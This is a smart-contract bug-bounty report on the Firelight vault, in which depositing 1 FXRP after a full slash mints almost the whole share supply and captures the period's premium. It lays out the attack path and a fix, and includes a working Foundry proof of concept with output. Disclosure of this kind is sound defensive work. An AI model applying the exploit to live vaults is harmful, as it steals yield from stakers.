# 88745 sc medium h 1 firelightvault deposit mints unbounded shares against a zero asset pool letting a 1 fxrp deposit capture the entire period s premium from the stakers who underwrote it

**Submitted on Aug 14th 2026 at 19:36:27 UTC by @web3pavlou for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88745
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Theft of unclaimed yield

## Description

## Brief/Intro

After a validated incident consumes the vault in full, `FirelightVault` is left with `totalAssets() == 0` while `totalSupply()` is unchanged — the slash reduces the asset pool but never burns shares. In that state the share-issuance formula divides by a denominator of `1`, so any deposit mints approximately `assets × totalSupply` shares.

`IncidentManager.approveCurrentAssessment` clears the deposit gate in the same transaction that executes the payout (`IncidentManager.sol:434-436` → `:829` → `vault.setActiveIncident(period, false)`), so deposits reopen immediately.

An attacker back-running that transaction with 1 FXRP acquires 99.99% of all shares. When the period's premium is subsequently returned to stakers through `VaultRewardDistributor.distributeRewards` (the protocol's only on-chain path for premium) the attacker receives essentially all of it. The stakers whose capital actually underwrote that period's cover receive dust.

In the PoC below the attacker turns 1 FXRP into 50,000.95 FXRP, and the underwriter who staked 1,000,000 FXRP receives 0.05 FXRP of the 50,000 FXRP premium their capital earned.

## Vulnerability Details

### Root cause

`FirelightVault.sol:1058-1065`:

```solidity
function _convertToSharesTotals(
    uint256 assets,
    uint256 totSupply,
    uint256 totAssets,
    Math.Rounding rounding
) private view returns (uint256) {
    return assets.mulDiv(totSupply + 10 ** _decimalsOffset(), totAssets + 1, rounding);
}
```

`_decimalsOffset()` is never overridden, so it returns `0`. When `totAssets == 0` the denominator collapses to `1` and the expression degenerates to:

```
shares = assets × (totalSupply + 1)
```

There is no lower bound on the denominator and no guard on the resulting share count.

### Why the existing guard does not fire

`deposit()` does contain a degenerate-share-price guard, at `FirelightVault.sol:667-669`:

```solidity
// A dust deposit can floor to zero shares once the share price exceeds 1;
// reject it instead of pulling assets in exchange for nothing.
if (shares == 0) revert InvalidAmount();
```

The comment states the assumption precisely: it addresses the case where the share price rises **above** `1` and `shares` truncates downward. In the zero-asset case the share price is zero and `shares` explodes rather than truncating, so `shares == 0` is structurally unreachable. The guard was added as the remediation for Macro A-1 finding L-1 (commit `6806f358`); it bounds one end of the degenerate-price range and leaves the other unbounded.

### How the state is reached

{% stepper %}
{% step %}

## A validated incident is approved

`IncidentManager._executePayout` calls `vault.payout(receiver, amount, captureTimestamp)`.
{% endstep %}

{% step %}

## The payout depletes the vault

In `payout`, `paidAmount = Math.min(amount, Math.min(assetsAtCapturePeriod, activePayableAmount))`. When the assessed loss meets or exceeds the vault, `paidFromActive == currentActiveAssets` and `FirelightVault.sol:952` pushes a post-payout checkpoint of `0`.
{% endstep %}

{% step %}

## Assets reach zero while shares remain

`totalAssets()` (`FirelightVault.sol:428`) now returns `0`. `totalSupply()` is untouched.
{% endstep %}

{% step %}

## The incident is closed and deposits reopen

Still inside `approveCurrentAssessment`, `IncidentManager.sol:436` calls `_decreaseIncident(incident.period)`, which at `IncidentManager.sol:829` calls `vault.setActiveIncident(period, false)`.
{% endstep %}

{% step %}

## The deposit gate is clear

`_hasActiveIncident()` (`FirelightVault.sol:1115`) checks `hasActiveIncident[currentPeriod] || hasActiveIncident[currentPeriod - 1]`. Both are now false, so `deposit()` is open in the very next transaction.
{% endstep %}
{% endstepper %}

### How the loss is realised

Premium is not credited per-user. `VaultRewardDistributor.distributeRewards` transfers vault asset into the vault (`VaultRewardDistributor.sol:146`) and calls `checkpointTotalAssets()` (`:150`). This raises `balanceOf(vault)` and therefore the redemption value of whatever shares exist at that moment. There is no per-period accrual and no record of which cohort earned the premium.

So period P's premium — earned by the capital that backed period P's cover — is distributed according to the share register *after* the slash, which the attacker now dominates.

***

## Attack path

{% stepper %}
{% step %}

## Underwriter deposits in period P

**Underwriter** deposits `1,000,000 FXRP` in period P. Receives `1e12` shares.

`totalAssets() == totalSupply() == 1e12`.
{% endstep %}

{% step %}

## Premium is earned

Period P closes; cover sold against that capital earned `50,000 FXRP` of premium, sitting at `premiumCollector` awaiting the off-chain swap.
{% endstep %}

{% step %}

## An incident depletes the vault

A period-P incident is assessed at or above the vault's value and approved. `payout` transfers `1e12` out; `totalAssets() == 0`, `totalSupply() == 1e12`. The deposit gate clears in the same transaction.
{% endstep %}

{% step %}

## Attacker deposits 1 FXRP

**Attacker** deposits `1 FXRP` (`1e6`). Share maths:

```
1e6 × (1e12 + 1) ÷ 1 = 1,000,000,000,001,000,000
```

The attacker holds **9,999 bps** of supply.
{% endstep %}

{% step %}

## Premium returns to the vault

The Distributor performs its routine premium return: `distributeRewards(50_000e6, ...)`.

Vault balance becomes `50,001,000,000`.
{% endstep %}

{% step %}

## Shares redeem against the premium

Redemption values:

* Attacker: `50,000,950,000` = **50,000.95 FXRP**
* Underwriter: `50,000` = **0.05 FXRP**
  {% endstep %}
  {% endstepper %}

Net attacker profit: **49,999.95 FXRP on a 1 FXRP outlay (\~50,000×)**, with no privileged role and no capital at risk beyond 1 FXRP.

## Impact Details

**Theft of unclaimed yield** — listed at High on this program's published impacts.

The period's premium is yield earned by the cohort whose staked capital backed that period's cover. It is unclaimed at the time of the attack — still off-chain, awaiting the swap. The attacker captures it in full by holding shares acquired for a nominal sum after that cohort's capital was destroyed.

Victim class: **stakers whose capital was active at `capturePeriodStart` of the slashed period.** They lose 100% of the premium their capital earned, on top of the principal loss the slash already imposed.

Secondary: every subsequent inflow to the vault — later premium cycles, incentive distributions via `distributeIncentive`, and any recovery routed through the vault — accrues to the attacker on the same basis until the share register is corrected. There is no mechanism to correct it.

The attacker cannot induce the precondition, but a near-total loss is the scenario this protocol exists to process, not an exotic one.

***

## Distinction from the accepted risk in Macro A-1

Macro A-1 records under Accepted Risks:

> *"New deposits can capture a pending reward distribution (accepted) — Because rewards are injected by raising the vault redemption value, a deposit placed just before a distribution shares in yield it did not earn... It is mitigated by the withdrawal delay and by incident risk, since the new capital cannot exit immediately and remains exposed for the period."*

This finding is distinct on three counts, and Control A exists specifically to demonstrate the first:

* **Different magnitude and different root cause.** The accepted risk is proportional dilution inherent to ERC-4626 — deposit 1 FXRP into a healthy 1,000,000 FXRP vault and you receive 1/1,000,001 of the yield. Control A reproduces exactly that: the same 1 FXRP earns `49,999` units, four decimal orders below the attack. This finding is non-proportional capture caused by a zero denominator in `_convertToSharesTotals`, not by distribution timing.
* **Both cited mitigations are inoperative in this state.** "Remains exposed for the period" is void — the incident has already occurred and been settled. "Cannot exit immediately" is irrelevant when the capital at risk is 1 FXRP against a 50,000 FXRP capture.
* **The economics invert.** Under the accepted risk a late depositor must commit capital proportional to what they hope to capture. Here the required capital is arbitrarily close to zero.

If triage nonetheless concludes this is covered by the accepted risk, I would ask that the zero-denominator issuance be considered on its own as the underlying defect, independent of who captures the yield.

***

## Recommended mitigation

**Minimal fix** — reject issuance against a zero-asset pool, in `deposit()` and `mint()`:

```solidity
if (totalSupply() > 0 && totalAssets() == 0) revert InvalidAmount();
```

Note that this alone leaves the vault permanently closed to deposits after a total loss, so it needs a companion recovery path — an admin-gated reset that writes off the worthless share supply before reopening.

**Note on `_decimalsOffset()`:** raising the virtual-share offset does **not** fix this. The offset appears in the numerator (`totSupply + 10 ** _decimalsOffset()`), so when `totAssets == 0` it increases the minted share count rather than bounding it. It defends against the donation/inflation attack, which is a different problem.

**Proper fix** — attribute yield to the cohort that earned it. Have `distributeRewards` / `distributeIncentive` credit a per-period accrual claimable only by holders with a share checkpoint at or before that period's start, rather than raising `balanceOf(vault)` and letting the current share register decide. The vault already maintains `_traceBalanceOf` and `_traceTotalSupply` for exactly this kind of historical lookup. This also resolves the mirror-image problem where a staker who requests withdrawal retains slash exposure for up to two periods while forfeiting all yield accrued in that window.

***

## References

* `contracts/core/FirelightVault.sol:1058-1065` — `_convertToSharesTotals`, zero-denominator issuance
* `contracts/core/FirelightVault.sol:667-669` — the `shares == 0` guard and its one-directional comment
* `contracts/core/FirelightVault.sol:428` — `totalAssets()`
* `contracts/core/FirelightVault.sol:952` — post-payout checkpoint of `0`
* `contracts/core/FirelightVault.sol:1115` — `_hasActiveIncident()`
* `contracts/core/IncidentManager.sol:434-436` — payout closes the incident and decrements the counter
* `contracts/core/IncidentManager.sol:829` — `setActiveIncident(period, false)` reopens deposits
* `contracts/core/VaultRewardDistributor.sol:146,150` — premium transfer and checkpoint

## Proof of Concept

Foundry. Uses the shared `Base.t.sol` fixture, a Solidity port of the project's own `test/setup/fixtures.js`. This PoC calls `deployVault()` and `deployRewardDistributor()`; the allocator half of the fixture is unused here and included solely so the file matches the one used across my other submissions.

The PoC calls `vault.payout` directly under `PAYOUT_ROLE` rather than driving a full incident through `IncidentManager` — the resulting vault state is identical, and step 4 of "How the state is reached" above documents that production reopens deposits in the same transaction as the payout.

**`test/Foundry/Base.t.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {FirelightVault} from "contracts/core/FirelightVault.sol";
import {CoverOrderAllocator} from "contracts/core/CoverOrderAllocator.sol";
import {CoverNFT} from "contracts/core/CoverNFT.sol";
import {VaultRewardDistributor} from "contracts/core/VaultRewardDistributor.sol";
import {ICoverOrderAllocator} from "contracts/core/interfaces/ICoverOrderAllocator.sol";
import {IFirelightVault} from "contracts/core/interfaces/IFirelightVault.sol";
import {IAggregatorV3} from "contracts/core/interfaces/IAggregatorV3.sol";

import {MockFAsset} from "./mocks/MockFAsset.sol";
import {MockERC20} from "contracts/test/MockERC20.sol";
import {MockAggregatorV3} from "contracts/test/MockAggregatorV3.sol";
import {MockCoverOrderAllocatorVault} from "contracts/test/MockCoverOrderAllocatorVault.sol";

/**
 * @title Base
 * @notice Solidity port of test/setup/fixtures.js — `deployVault` and
 *         `deployCoverOrderAllocator` — so the Hardhat suite and the Foundry suite
 *         exercise identical deployments.
 *
 * Two deliberate deviations from the JS, both noted where they matter:
 *
 *  1. Proxies are ERC1967Proxy rather than the Transparent proxies `upgrades.deployProxy`
 *     creates. Storage layout and delegatecall semantics are identical, and it removes the
 *     ProxyAdmin indirection that would otherwise make every `vm.prank` two-hop.
 *
 *  2. The underlying is `MockFAsset`, not the real `deployFAsset` helper — contracts/fasset
 *     is pragma 0.8.23 and skipped in foundry.toml. MockFAsset reproduces
 *     `FAsset.transferFrom` line for line, including the round-UP fee, and defaults to a
 *     zero fee so it behaves exactly like a plain ERC20 until a test opts in.
 */
abstract contract Base is Test {
    uint8 internal constant DECIMALS = 6;
    string internal constant UNDERLYING = "fXRP";
    string internal constant LST = "stfXRP";
    uint256 internal constant INITIAL_DEPOSIT_LIMIT = 50_000_000_000;
    uint48 internal constant PERIOD_DURATION = 604800;

    uint256 internal constant BPS = 10_000;
    uint256 internal constant LEV = 10_000;
    uint256 internal constant SECS_PER_YEAR = 365 days;
    string internal constant PROTOCOL_MORPHO = "Morpho";
    string internal constant PROTOCOL_AAVE = "Aave";
    bytes32 internal constant MARKET_A = bytes32("market-A");
    bytes32 internal constant MARKET_B = bytes32("market-B");

    MockFAsset internal token;
    FirelightVault internal vault;
    address internal deployer;
    address internal rescuer;
    address internal blocklister;
    address internal pauser;
    address internal limitUpdater;
    address internal periodConfigurationUpdater;
    address internal payoutSigner;
    address internal payoutAllowlister;
    address internal payoutReceiver;
    address internal incidentRole;
    address internal checkpointer;
    address[3] internal users;
    VaultRewardDistributor internal distributor;
    address internal distributorEOA;

    CoverOrderAllocator internal allocator;
    CoverNFT internal coverNFT;
    MockCoverOrderAllocatorVault internal mockVault;
    MockAggregatorV3 internal priceFeed;
    MockERC20 internal usdc;
    MockERC20 internal usdt;
    address internal admin;
    address internal curator;
    address internal allocatorRole;
    address internal configAdmin;
    address internal adminRole;
    address internal premiumCollector;
    address internal firstLossBufferWallet;
    address internal buyer1;
    address internal buyer2;
    address internal beneficiary;
    bytes32 internal marketIdA;
    bytes32 internal marketIdB;
    bytes32 internal concHashMorpho;
    bytes32 internal concHashAave;

    function deployVault() internal {
        if (block.timestamp < 1_700_000_000) vm.warp(1_700_000_000);

        deployer = _signer("deployer");
        rescuer = _signer("rescuer");
        blocklister = _signer("blocklister");
        pauser = _signer("pauser");
        limitUpdater = _signer("limitUpdater");
        periodConfigurationUpdater = _signer("periodConfigurationUpdater");
        users[0] = _signer("user1");
        users[1] = _signer("user2");
        users[2] = _signer("user3");

        token = new MockFAsset(UNDERLYING, UNDERLYING, DECIMALS);

        FirelightVault.InitParams memory p = FirelightVault.InitParams({
            defaultAdmin: deployer,
            limitUpdater: limitUpdater,
            blocklister: blocklister,
            pauser: pauser,
            periodConfigurationUpdater: periodConfigurationUpdater,
            rescuer: rescuer,
            depositLimit: INITIAL_DEPOSIT_LIMIT,
            periodConfigurationDuration: PERIOD_DURATION
        });

        FirelightVault impl = new FirelightVault();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl), abi.encodeCall(FirelightVault.initialize, (IERC20(address(token)), LST, LST, abi.encode(p)))
        );
        vault = FirelightVault(address(proxy));

        payoutSigner = _signer("payoutSigner");
        payoutAllowlister = _signer("payoutAllowlister");
        payoutReceiver = _signer("payoutReceiver");
        incidentRole = _signer("incident");
        checkpointer = _signer("checkpointer");

        vm.startPrank(deployer);
        vault.grantRole(vault.PAYOUT_ROLE(), payoutSigner);
        vault.grantRole(vault.PAYOUT_ALLOWLIST_ROLE(), payoutAllowlister);
        vault.grantRole(vault.INCIDENT_ROLE(), incidentRole);
        vault.grantRole(vault.CHECKPOINT_ROLE(), checkpointer);
        vm.stopPrank();

        vm.prank(payoutAllowlister);
        vault.addToPayoutAllowlist(payoutReceiver);
    }

    function deployCoverOrderAllocator() internal {
        if (block.timestamp < 1_700_000_000) vm.warp(1_700_000_000);

        admin = _signer("admin");
        curator = _signer("curator");
        allocatorRole = _signer("allocatorRole");
        configAdmin = _signer("configAdmin");
        adminRole = _signer("adminRole");
        premiumCollector = _signer("premiumCollector");
        firstLossBufferWallet = _signer("firstLossBufferWallet");
        buyer1 = _signer("buyer1");
        buyer2 = _signer("buyer2");
        beneficiary = _signer("beneficiary");

        mockVault = new MockCoverOrderAllocatorVault();
        mockVault.setCurrentPeriod(1);
        mockVault.setTotalAssets(0);
        for (uint256 i = 1; i <= 3; i++) {
            mockVault.setPeriodConfiguration(
                i, IFirelightVault.PeriodConfiguration({epoch: 0, duration: PERIOD_DURATION, startingPeriod: i})
            );
        }

        usdc = new MockERC20("MockUSDC", "mUSDC", 6);
        usdt = new MockERC20("MockUSDT", "mUSDT", 6);
        mockVault.setAsset(address(usdc));

        priceFeed = new MockAggregatorV3(18, int256(10 ** 18));

        CoverNFT nftImpl = new CoverNFT();
        coverNFT = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(nftImpl),
                    abi.encodeCall(
                        CoverNFT.initialize,
                        ("Firelight Cover", "FLCOVER", "", admin, address(this), address(0), address(0))
                    )
                )
            )
        );

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](2);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: PROTOCOL_MORPHO, market: MARKET_A});
        markets[1] = ICoverOrderAllocator.Market({chainId: 10, protocol: PROTOCOL_AAVE, market: MARKET_B});

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concs =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](2);
        concs[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1, protocol: PROTOCOL_MORPHO, maxProtocolConcentrationBps: 6000
        });
        concs[1] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 10, protocol: PROTOCOL_AAVE, maxProtocolConcentrationBps: 4000
        });

        address[] memory premiumTokens = new address[](2);
        premiumTokens[0] = address(usdc);
        premiumTokens[1] = address(usdt);

        ICoverOrderAllocator.InitParams memory ip = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(mockVault)),
            premiumCollector: premiumCollector,
            coverNFT: coverNFT,
            priceFeedAdapter: IAggregatorV3(address(priceFeed)),
            maxPriceAge: 7 days,
            premiumTokens: premiumTokens,
            admin: admin,
            adminRole: adminRole,
            curatorRole: curator,
            allocatorRole: allocatorRole,
            configAdminRole: configAdmin,
            initialProtocolConcentrations: concs,
            newMarkets: markets,
            capacityConfig: ICoverOrderAllocator.CapacityConfig({
                minCAR: 12000,
                firstLossBufferToken: IERC20(address(usdc)),
                firstLossBuffer: firstLossBufferWallet,
                effectiveLeverage: 24000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        });

        CoverOrderAllocator aImpl = new CoverOrderAllocator();
        allocator = CoverOrderAllocator(
            address(new ERC1967Proxy(address(aImpl), abi.encodeCall(CoverOrderAllocator.initialize, (ip))))
        );

        bytes32 minterRole = coverNFT.MINTER_ROLE();
        vm.prank(admin);
        coverNFT.grantRole(minterRole, address(allocator));

        marketIdA = computeMarketId(1, PROTOCOL_MORPHO, MARKET_A);
        marketIdB = computeMarketId(10, PROTOCOL_AAVE, MARKET_B);
        concHashMorpho = computeProtocolConcentrationHash(1, PROTOCOL_MORPHO);
        concHashAave = computeProtocolConcentrationHash(10, PROTOCOL_AAVE);
    }

    function deployFullStack() internal {
        admin = _signer("admin");
        curator = _signer("curator");
        allocatorRole = _signer("allocatorRole");
        configAdmin = _signer("configAdmin");
        adminRole = _signer("adminRole");
        premiumCollector = _signer("premiumCollector");
        firstLossBufferWallet = _signer("firstLossBufferWallet");
        buyer1 = _signer("buyer1");
        buyer2 = _signer("buyer2");
        beneficiary = _signer("beneficiary");

        usdc = new MockERC20("MockUSDC", "mUSDC", 6);
        priceFeed = new MockAggregatorV3(18, int256(10 ** 18));

        CoverNFT nftImpl = new CoverNFT();
        coverNFT = CoverNFT(
            address(
                new ERC1967Proxy(
                    address(nftImpl),
                    abi.encodeCall(
                        CoverNFT.initialize,
                        ("Firelight Cover", "FLCOVER", "", admin, address(this), address(0), address(0))
                    )
                )
            )
        );

        ICoverOrderAllocator.Market[] memory markets = new ICoverOrderAllocator.Market[](1);
        markets[0] = ICoverOrderAllocator.Market({chainId: 1, protocol: PROTOCOL_MORPHO, market: MARKET_A});

        ICoverOrderAllocator.ProtocolConcentrationInput[] memory concs =
            new ICoverOrderAllocator.ProtocolConcentrationInput[](1);
        concs[0] = ICoverOrderAllocator.ProtocolConcentrationInput({
            chainId: 1, protocol: PROTOCOL_MORPHO, maxProtocolConcentrationBps: 10000
        });

        address[] memory premiumTokens = new address[](1);
        premiumTokens[0] = address(usdc);

        ICoverOrderAllocator.InitParams memory ip = ICoverOrderAllocator.InitParams({
            vault: IFirelightVault(address(vault)),
            premiumCollector: premiumCollector,
            coverNFT: coverNFT,
            priceFeedAdapter: IAggregatorV3(address(priceFeed)),
            maxPriceAge: 7 days,
            premiumTokens: premiumTokens,
            admin: admin,
            adminRole: adminRole,
            curatorRole: curator,
            allocatorRole: allocatorRole,
            configAdminRole: configAdmin,
            initialProtocolConcentrations: concs,
            newMarkets: markets,
            capacityConfig: ICoverOrderAllocator.CapacityConfig({
                minCAR: 12000,
                firstLossBufferToken: IERC20(address(usdc)),
                firstLossBuffer: firstLossBufferWallet,
                effectiveLeverage: 24000,
                minOrderMarketCoverAmount: 1,
                divergenceToleranceBps: 0
            })
        });

        CoverOrderAllocator aImpl = new CoverOrderAllocator();
        allocator = CoverOrderAllocator(
            address(new ERC1967Proxy(address(aImpl), abi.encodeCall(CoverOrderAllocator.initialize, (ip))))
        );

        bytes32 minterRole = coverNFT.MINTER_ROLE();
        vm.prank(admin);
        coverNFT.grantRole(minterRole, address(allocator));

        marketIdA = computeMarketId(1, PROTOCOL_MORPHO, MARKET_A);
        concHashMorpho = computeProtocolConcentrationHash(1, PROTOCOL_MORPHO);
    }

    function refreshPriceFeed() internal {
        priceFeed.setUpdatedAt(block.timestamp);
    }

    function expectedCapacity(uint256 vaultAssets6dp) internal pure returns (uint256) {
        return (vaultAssets6dp * 10 ** 12) * 24000 / 12000;
    }

    function mintAndApprove(uint256 amount, address user) internal {
        token.mintTo(user, amount);
        vm.prank(user);
        token.approve(address(vault), amount);
    }

    function deployRewardDistributor() internal {
        distributorEOA = _signer("distributorEOA");

        VaultRewardDistributor dImpl = new VaultRewardDistributor();
        distributor = VaultRewardDistributor(
            address(
                new ERC1967Proxy(
                    address(dImpl),
                    abi.encodeCall(
                        VaultRewardDistributor.initialize,
                        (IFirelightVault(address(vault)), deployer, distributorEOA, address(0))
                    )
                )
            )
        );

        bytes32 checkpointRole = vault.CHECKPOINT_ROLE();
        vm.prank(deployer);
        vault.grantRole(checkpointRole, address(distributor));
    }

    function distributePremium(uint256 amount) internal {
        token.mintTo(distributorEOA, amount);
        vm.startPrank(distributorEOA);
        token.approve(address(distributor), amount);
        distributor.distributeRewards(amount, address(token), amount, uint48(block.timestamp));
        vm.stopPrank();
    }

    function raiseDepositLimit() internal {
        raiseDepositLimit(1_000_000_000e6);
    }

    function raiseDepositLimit(uint256 newLimit) internal {
        vm.prank(limitUpdater);
        vault.updateDepositLimit(newLimit);
    }

    function fundAndApprove(address buyer, MockERC20 t, uint256 amount) internal {
        t.mint(buyer, amount);
        vm.prank(buyer);
        t.approve(address(allocator), amount);
    }

    function advanceToPeriod(uint256 p) internal {
        mockVault.setCurrentPeriod(p);
    }

    function warpPeriods(uint256 n) internal {
        vm.warp(block.timestamp + n * PERIOD_DURATION);
    }

    function periodStart(uint256 period) internal view returns (uint48) {
        FirelightVault.PeriodConfiguration memory c = vault.periodConfigurationAtNumber(period);
        return uint48(c.epoch + (period - c.startingPeriod) * c.duration);
    }

    function computeMarketId(uint64 chainId, string memory protocol, bytes32 market) internal pure returns (bytes32) {
        return keccak256(abi.encode(chainId, protocol, market));
    }

    function computeProtocolConcentrationHash(uint64 chainId, string memory protocol) internal pure returns (bytes32) {
        return keccak256(abi.encode(chainId, protocol));
    }

    function settleLeaf(uint256 orderId, ICoverOrderAllocator.MarketCoverAllocation[] memory allocs)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(bytes.concat(keccak256(abi.encode(orderId, allocs))));
    }

    function merkleRoot2(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encode(a, b)) : keccak256(abi.encode(b, a));
    }

    function _signer(string memory label) internal returns (address a) {
        a = makeAddr(label);
        vm.deal(a, 1000 ether);
    }

    function oneMarket(bytes32 marketId, uint256 amount)
        internal
        pure
        returns (ICoverOrderAllocator.MarketCoverAllocation[] memory arr)
    {
        arr = new ICoverOrderAllocator.MarketCoverAllocation[](1);
        arr[0] = ICoverOrderAllocator.MarketCoverAllocation({marketId: marketId, allocatedCover: amount});
    }

    function oneMarketInput(bytes32 marketId, uint32 rateAnnual, uint256 amount)
        internal
        pure
        returns (ICoverOrderAllocator.MarketAllocationInput[] memory arr)
    {
        arr = new ICoverOrderAllocator.MarketAllocationInput[](1);
        arr[0] = ICoverOrderAllocator.MarketAllocationInput({
            marketId: marketId, coverRateAnnual: rateAnnual, coverAmount: amount
        });
    }
}
```

**`test/Foundry/mocks/MockFAsset.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

/// Replica of contracts/fasset/fassetToken/implementation/FAsset.sol, which is pragma
/// 0.8.23 and skipped in foundry.toml. The transfer fee defaults to zero, so this behaves
/// as a plain ERC20 throughout this PoC.
contract MockFAsset is ERC20 {
    uint8 private immutable _decimals;
    uint256 public transferFeeMillionths;
    address public feeCollector = address(0xFEE);

    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) {
        _decimals = d;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function setTransferFeeMillionths(uint256 v) external {
        transferFeeMillionths = v;
    }

    function mintTo(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _transferFeeAmount(uint256 amount) public view returns (uint256) {
        if (transferFeeMillionths == 0) return 0;
        return Math.mulDiv(amount, transferFeeMillionths, 1_000_000, Math.Rounding.Ceil);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        uint256 fee = _transferFeeAmount(amount);
        _transfer(_msgSender(), to, amount - fee);
        if (fee > 0) _transfer(_msgSender(), feeCollector, fee);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _spendAllowance(from, _msgSender(), amount);
        uint256 fee = _transferFeeAmount(amount);
        _transfer(from, to, amount - fee);
        if (fee > 0) _transfer(from, feeCollector, fee);
        return true;
    }
}
```

**`test/Foundry/PremiumCapture.t.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Base} from "./Base.t.sol";
import {console2} from "forge-std/Test.sol";

contract PremiumCapture is Base {
    uint256 constant STAKE = 1_000_000e6;
    uint256 constant PREMIUM = 50_000e6;
    uint256 constant DUST = 1e6;

    address underwriter;
    address opportunist;

    function setUp() public {
        deployVault();
        deployRewardDistributor();
        raiseDepositLimit();
        underwriter = users[0];
        opportunist = users[1];
    }

    function testPremiumForPeriodPIsCapturedByAPostSlashDepositor() public {
        mintAndApprove(STAKE, underwriter);
        vm.prank(underwriter);
        vault.deposit(STAKE, underwriter);

        warpPeriods(1);
        uint48 capture = vault.currentPeriodStart();
        assertEq(vault.totalAssetsAt(capture), STAKE, "underwriter is the period-start collateral");

        vm.prank(payoutSigner);
        vault.payout(payoutReceiver, STAKE, capture);
        assertEq(vault.totalAssets(), 0, "vault wiped");
        assertGt(vault.totalSupply(), 0, "shares outstanding against nothing");

        mintAndApprove(DUST, opportunist);
        vm.prank(opportunist);
        uint256 got = vault.deposit(DUST, opportunist);
        console2.log("opportunist paid    :", DUST);
        console2.log("opportunist shares  :", got);
        console2.log("ownership (bps)     :", got * 10_000 / vault.totalSupply());

        distributePremium(PREMIUM);

        uint256 underwriterGets = vault.previewRedeem(vault.balanceOf(underwriter));
        uint256 opportunistGets = vault.previewRedeem(vault.balanceOf(opportunist));

        console2.log("--- period P premium:", PREMIUM);
        console2.log("underwriter receives:", underwriterGets);
        console2.log("opportunist receives:", opportunistGets);

        assertGt(opportunistGets, PREMIUM * 99 / 100, "opportunist takes ~the whole premium");
        assertLt(underwriterGets, PREMIUM / 100_000, "underwriter gets <0.001% of what it earned");
        assertGt(opportunistGets, DUST * 1000, "risk-free multiple on the outlay");
    }

    function testControlWithoutTheSlashPremiumFollowsContribution() public {
        mintAndApprove(STAKE, underwriter);
        vm.prank(underwriter);
        vault.deposit(STAKE, underwriter);

        warpPeriods(1);

        mintAndApprove(DUST, opportunist);
        vm.prank(opportunist);
        vault.deposit(DUST, opportunist);

        distributePremium(PREMIUM);

        uint256 underwriterGain = vault.previewRedeem(vault.balanceOf(underwriter)) - STAKE;
        uint256 opportunistGain = vault.previewRedeem(vault.balanceOf(opportunist)) - DUST;

        console2.log("underwriter gain :", underwriterGain);
        console2.log("opportunist gain :", opportunistGain);

        assertGt(underwriterGain, PREMIUM * 99 / 100, "premium goes to the capital that earned it");
        assertLt(opportunistGain, PREMIUM / 1000, "dust earns dust");
    }

    function testControlDepositingBeforeTheSlashEarnsNoPrivilege() public {
        mintAndApprove(STAKE, underwriter);
        vm.prank(underwriter);
        vault.deposit(STAKE, underwriter);

        mintAndApprove(DUST, opportunist);
        vm.prank(opportunist);
        vault.deposit(DUST, opportunist);

        warpPeriods(1);
        uint48 capture = vault.currentPeriodStart();

        uint256 everything = vault.totalAssets();
        vm.prank(payoutSigner);
        vault.payout(payoutReceiver, everything, capture);

        distributePremium(PREMIUM);

        uint256 opportunistGets = vault.previewRedeem(vault.balanceOf(opportunist));
        console2.log("opportunist (pre-slash entry) receives:", opportunistGets);

        assertLt(opportunistGets, PREMIUM / 1000, "no privilege when you shared the loss");
    }
}
```

### Output

```
$ forge test --match-contract PremiumCapture -vv

Ran 3 tests for test/Foundry/PremiumCapture.t.sol:PremiumCapture
[PASS] testControlDepositingBeforeTheSlashEarnsNoPrivilege() (gas: 749384)
Logs:
  opportunist (pre-slash entry) receives: 49999

[PASS] testControlWithoutTheSlashPremiumFollowsContribution() (gas: 746303)
Logs:
  underwriter gain : 49999950000
  opportunist gain : 49999

[PASS] testPremiumForPeriodPIsCapturedByAPostSlashDepositor() (gas: 813638)
Logs:
  opportunist paid    : 1000000
  opportunist shares  : 1000000000001000000
  ownership (bps)     : 9999
  --- period P premium: 50000000000
  underwriter receives: 50000
  opportunist receives: 50000950000

Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 12.40ms (3.82ms CPU time)
```

Three runs, one variable, and the same 1 FXRP deposit in every one of them:

| Run             | When the 1 FXRP was deposited               | What it received         |
| --------------- | ------------------------------------------- | ------------------------ |
| Control A       | into a healthy vault, no slash at all       | **49,999** units         |
| Control B       | before the slash, so it shared the loss     | **49,999** units         |
| **The finding** | **after the slash, into a zero-asset pool** | **50,000,950,000** units |

Both controls land on the same figure. Only the deposit that arrives after `totalAssets()` reaches zero diverges, and it diverges by a factor of **one million**.

That comparison forecloses the two readings that would otherwise dismiss the finding:

* **It is not ordinary ERC-4626 dilution.** Control A *is* ordinary dilution — a late deposit into a healthy vault taking its proportional 49,999 units of the premium. The attack is four decimal orders removed from it, so the two are not the same phenomenon at different scales.
